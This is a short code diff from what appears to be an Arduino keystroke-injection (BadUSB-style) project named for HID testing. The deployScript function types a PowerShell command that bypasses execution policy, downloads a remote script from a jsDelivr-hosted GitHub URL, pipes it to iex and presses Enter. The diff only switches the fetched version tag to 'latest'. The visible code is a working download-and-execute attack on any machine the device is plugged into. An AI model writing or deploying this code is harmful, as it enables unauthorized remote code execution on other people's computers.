@@ -30,7 +30,7 @@ void deployScript() {
   delay(500);
 
   Keyboard.print("powershell -ExecutionPolicy Bypass -Command ");
-  Keyboard.print("\"iwr -useb https://cdn.jsdelivr.net/gh/Greg4268/Arduino_HID_Testing@updated-script/pwshScript.ps1 | iex\"");
+  Keyboard.print("\"iwr -useb https://cdn.jsdelivr.net/gh/Greg4268/Arduino_HID_Testing@latest/pwshScript.ps1 | iex\"");
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
